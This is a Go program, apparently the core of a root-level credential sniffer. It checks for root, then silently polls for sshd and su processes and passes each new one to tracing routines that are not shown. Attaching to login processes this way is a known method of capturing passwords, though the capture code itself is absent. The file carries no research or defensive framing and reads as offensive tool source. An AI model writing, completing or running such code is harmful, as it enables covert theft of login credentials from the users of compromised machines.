package main

import (
	"os"
	"os/signal"
	"syscall"
	"time"
)

var shutdownChan = make(chan struct{})

func main() {
	if syscall.Geteuid() != 0 {
		os.Exit(1)
	}

	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigc
		close(shutdownChan)
		os.Exit(0)
	}()

	go watchProcesses("sshd", findSSHDProcesses, traceSSHDProcess)
	go watchProcesses("su", findSUProcesses, traceSUProcess)

	select {}
}

func watchProcesses(processName string, findFunc func() ([]int, error), traceFunc func(int)) {
	processedPIDs := make(map[int]struct{})
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-shutdownChan:
			return
		case <-ticker.C:
			pids, err := findFunc()
			if err != nil {
				continue
			}

			for _, pid := range pids {
				if _, processed := processedPIDs[pid]; !processed {
					go func(processName string, pid int) {
						//fmt.Printf("Tracing %s process: %d\n", processName, pid)
						traceFunc(pid)
						//fmt.Printf("%s process %d traced.\n", processName, pid)
					}(processName, pid)
					processedPIDs[pid] = struct{}{}
				}
			}
		}
	}
}
